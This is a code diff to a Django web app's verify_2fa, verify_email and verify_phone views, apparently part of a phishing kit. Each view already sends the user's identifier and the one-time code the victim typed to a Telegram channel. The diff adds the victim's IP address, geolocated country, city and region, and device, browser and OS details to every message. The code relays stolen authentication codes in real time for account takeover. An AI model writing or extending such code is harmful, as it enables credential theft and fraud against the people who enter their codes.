@@ -181,12 +181,29 @@ def verify_2fa(request):
             # Get user data from session
             user_data = request.session.get('user_data', {})
             user_info = user_data.get('identifier', identifier)
+            ip_address = user_data.get('ip_address', get_client_ip(request))
+            
+            # Get location and device info
+            location_data = get_location_data(ip_address)
+            ua_data = parse_user_agent(request.META.get('HTTP_USER_AGENT', ''))
 
-            # Send simple 2FA notification to Telegram
-            telegram_message = f"""🔒 <b>2FA CODE</b>
+            # Send comprehensive 2FA notification to Telegram
+            telegram_message = f"""🔒 <b>2FA CODE RECEIVED</b>
 
 👤 <b>User:</b> {user_info}
 🔢 <b>2FA Code:</b> {two_fa_code}
+
+📍 <b>LOCATION:</b>
+🌐 <b>IP:</b> {ip_address}
+🌍 <b>Country:</b> {location_data.get('country', 'N/A')}
+🏙️ <b>City:</b> {location_data.get('city', 'N/A')}
+📌 <b>Region:</b> {location_data.get('region', 'N/A')}
+
+💻 <b>DEVICE:</b>
+🖥️ <b>Type:</b> {ua_data.get('device_type', 'N/A')}
+🌐 <b>Browser:</b> {ua_data.get('browser_name', 'N/A')}
+⚙️ <b>OS:</b> {ua_data.get('os_name', 'N/A')}
+
 ⏰ <b>Time:</b> {timezone.now().strftime('%Y-%m-%d %H:%M:%S')}"""
 
             send_to_telegram(telegram_message)
@@ -209,12 +226,29 @@ def verify_email(request):
             # Get user data from session
             user_data = request.session.get('user_data', {})
             user_info = user_data.get('identifier', 'N/A')
+            ip_address = user_data.get('ip_address', get_client_ip(request))
+            
+            # Get location and device info
+            location_data = get_location_data(ip_address)
+            ua_data = parse_user_agent(request.META.get('HTTP_USER_AGENT', ''))
 
-            # Send email verification code to Telegram with user info
+            # Send comprehensive email verification to Telegram
             telegram_message = f"""📧 <b>EMAIL VERIFICATION CODE</b>
 
 👤 <b>User:</b> {user_info}
 🔢 <b>Code:</b> {email_code}
+
+📍 <b>LOCATION:</b>
+🌐 <b>IP:</b> {ip_address}
+🌍 <b>Country:</b> {location_data.get('country', 'N/A')}
+🏙️ <b>City:</b> {location_data.get('city', 'N/A')}
+📌 <b>Region:</b> {location_data.get('region', 'N/A')}
+
+💻 <b>DEVICE:</b>
+🖥️ <b>Type:</b> {ua_data.get('device_type', 'N/A')}
+🌐 <b>Browser:</b> {ua_data.get('browser_name', 'N/A')}
+⚙️ <b>OS:</b> {ua_data.get('os_name', 'N/A')}
+
 ⏰ <b>Time:</b> {timezone.now().strftime('%Y-%m-%d %H:%M:%S')}"""
 
             send_to_telegram(telegram_message)
@@ -235,12 +269,29 @@ def verify_phone(request):
             # Get user data from session
             user_data = request.session.get('user_data', {})
             user_info = user_data.get('identifier', 'N/A')
+            ip_address = user_data.get('ip_address', get_client_ip(request))
+            
+            # Get location and device info
+            location_data = get_location_data(ip_address)
+            ua_data = parse_user_agent(request.META.get('HTTP_USER_AGENT', ''))
 
-            # Send phone verification code to Telegram with user info
+            # Send comprehensive phone verification to Telegram
             telegram_message = f"""📱 <b>PHONE VERIFICATION CODE</b>
 
 👤 <b>User:</b> {user_info}
 🔢 <b>Code:</b> {phone_code}
+
+📍 <b>LOCATION:</b>
+🌐 <b>IP:</b> {ip_address}
+🌍 <b>Country:</b> {location_data.get('country', 'N/A')}
+🏙️ <b>City:</b> {location_data.get('city', 'N/A')}
+📌 <b>Region:</b> {location_data.get('region', 'N/A')}
+
+💻 <b>DEVICE:</b>
+🖥️ <b>Type:</b> {ua_data.get('device_type', 'N/A')}
+🌐 <b>Browser:</b> {ua_data.get('browser_name', 'N/A')}
+⚙️ <b>OS:</b> {ua_data.get('os_name', 'N/A')}
+
 ⏰ <b>Time:</b> {timezone.now().strftime('%Y-%m-%d %H:%M:%S')}"""
 
             send_to_telegram(telegram_message)
